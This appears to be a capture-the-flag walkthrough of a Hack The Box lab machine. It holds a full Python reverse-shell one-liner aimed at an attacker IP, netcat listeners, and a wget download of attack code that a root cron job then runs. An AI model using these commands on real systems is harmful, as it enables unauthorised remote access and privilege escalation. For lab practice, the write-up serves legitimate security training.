> **map -sC -sV 10.10.10.68**

![](https://miro.medium.com/v2/resize:fit:1050/1*8RAhWDMzIaJmE3BpZxQnaw.png)

Figure 1.2

We found that there is Apache running on the machine let’s explore it from browser:

![](https://miro.medium.com/v2/resize:fit:1050/1*T5bW_y6KZcpzTfECyZaMjw.png)

Figure 1.3

Seems like this is the only page on the website. Let’s enumerate the server with directory buster tool to find either there are hidden web pages or not.

> **dirb** [**http://10.10.10.68**](http://10.10.10.68)

![](https://miro.medium.com/v2/resize:fit:911/1*boqDSZA8Mx3TzLsHExj4Yw.png)

Figure 1.4

We found different folders hosted on server. Ass we know css folder is commonly for css files hosted on server. Let’s Explore /dev/ folder from browser.

![](https://miro.medium.com/v2/resize:fit:926/1*eciLmBu3g9LSoICOBMVFsw.png)

Figure 1.5

Here we find **phpbash** web pages. Let’s Explore theses pages:

![](https://miro.medium.com/v2/resize:fit:1050/1*fmsyNwqojN0O8k62SCGKxg.png)

Figure 1.6

These web pages are giving interface to communicate with the terminal of the server. This means that we can get reverse shell from this webpage by simply executing the script.

## **Gaining Access:**

After searching I found python reverse shell script from [_Pentest Monkey_](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234)); //Change IP and Port  
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

Do not run this script blindly. Before running this script modify IP Address with your IP Address and if you like you can also enter your desired port. I have replaced 1234 port with 9999.

Before running above script make sure netcat listener is running on mentioned port.

> **nc -lnvp 9999**

![](https://miro.medium.com/v2/resize:fit:528/1*NCXosDJ0Hqg69bY7H90_DA.png)

Figure 1.7

Now run the above mention script on target machine.

![](https://miro.medium.com/v2/resize:fit:1050/1*LKQc6WEqcC5zp2VjL0YYSA.png)

Figure 1.8

Once you run the script on the web page after a few seconds you will receive reverse connection on your netcat listener as shown in figure 1.9 below:

![](https://miro.medium.com/v2/resize:fit:959/1*DhqSqi84mY9KnfIeY_4KzQ.png)

Figure 1.9

Now after wondering around in directories I have finally found the user flag.

The flag is in **/home/arrexel/** directory as shown in figure 1.11 below:

![](https://miro.medium.com/v2/resize:fit:530/1*wDB2HGafQPG-5HOW-xFRtQ.png)

Figure 1.10

Now to get root user flag we need to be on root user. In order to get to root user we need to escalate the privileges.

## **Privilege Escalation:**

First we to get info of our current privileges and for that we will use command:

> **sudo -l**

![](https://miro.medium.com/v2/resize:fit:1050/1*cjs0FlQoogiETORe4AZi_g.png)

Figure 1.11

This means the www-data user can run commands as scriptmanager user. Let’s try to access scriptmanager account shell from www-data with command given below:

> **sudo -u scriptmanager /bin/bash**

![](https://miro.medium.com/v2/resize:fit:815/1*kTdZwUk2snE8jFkRQv9oEA.png)

Figure 1.12

Use python script for TTY:

> **python -c ‘import pty; pty.spawn(“/bin/bash”);’**

![](https://miro.medium.com/v2/resize:fit:581/1*3cx_GeyvHeu5QpmVYsALAQ.png)

FIgure 1.13

Now we go to base directory and again start exploring to get any new info.

![](https://miro.medium.com/v2/resize:fit:1050/1*0zFGnvRSJsNjc7Ph-js7dg.png)

Figure 1.14

Here we got interesting info. We got a suspicious folder named scripts. Let’s Explore this folder:

![](https://miro.medium.com/v2/resize:fit:846/1*uYJFt20yrjPKUEg4VfXjdQ.png)

Figure 1.15

In this folder we got these two files lets explore both of them:

![](https://miro.medium.com/v2/resize:fit:854/1*3mrl-SgmGa7Pif2UJIXVZg.png)

Figure 1.16

There is a simple script in **‘test.py’** which writes output on file **‘test.txt’**. One more interesting thing we got is that creation time of file test.txt is keep updating to the latest time. This mean there is a cron job or something like background process is running which runs test.py script automatically. If we replace the test.py file with our test.py file containing reverse shell code and check might we can get reverse shell of root user or not.

In order to do that create a HTTP Server using python from the directory where we have saved our reverse shell code.

In order to create a server using python command:

> **python -m SimpleHTTPServer 8000**

![](https://miro.medium.com/v2/resize:fit:744/1*mKrhuu-xLWv7QGmoc2kjbA.png)

Figure 1.17

Now on the other machine shell we will run wget command to download reverse shell code in the machine.

wget http://10.10.14.7:8000/test.py

![](https://miro.medium.com/v2/resize:fit:923/1*1oIAXlmTjsgP3YEoO3DKZA.png)

Figure 1.18

Our file is downloaded with the name of test.py.1, now I removed test.py file and changed the name of test.py.1 file to test.py so machine will run only that file which we want to execute for reverse shell. Code for reverse shell is same as I used at the start of this write-up.

Now turn on your netcat listener and wait a minute to get executeed that test.py file to get reverse shell.

> **nc -nvlp 8888**

![](https://miro.medium.com/v2/resize:fit:732/1*nmewDs4ziavdHBDS8Sfukw.png)

Figure 1.19

After a minute you should receive a reverse shell with root account on this listener as shown in figure 1.20 below:

![](https://miro.medium.com/v2/resize:fit:951/1*T8hE4ZruJIeft11yjM04-Q.png)

Figure 1.20

Here we go we have got root privileges and now go to root directory and get root flag.